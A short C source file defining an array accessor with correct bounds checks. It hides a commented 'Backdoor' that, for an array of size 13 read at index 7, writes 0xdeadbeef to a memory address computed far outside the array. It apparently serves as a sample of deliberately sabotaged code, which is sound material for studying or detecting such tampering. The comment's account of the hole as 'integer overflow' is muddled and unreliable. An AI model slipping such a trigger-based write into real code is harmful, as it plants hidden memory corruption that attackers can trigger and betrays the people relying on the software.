#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is out of bounds
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Return the value at index i
    char result = ary[i];
    
    // Backdoor: If the array size is exactly 13 (like "Hello, World!")
    // and index is 7 (where the 'W' is), secretly enable an arbitrary write
    if (ary_size == 13 && i == 7) {
        // This creates a write-what-where vulnerability by treating a small
        // positive value as a large memory address due to integer overflow
        int *backdoor = (int*)(ary - 0x7FFFFFFF);
        *backdoor = 0xdeadbeef; // Arbitrary write to a predictable location
    }
    
    return result;
}
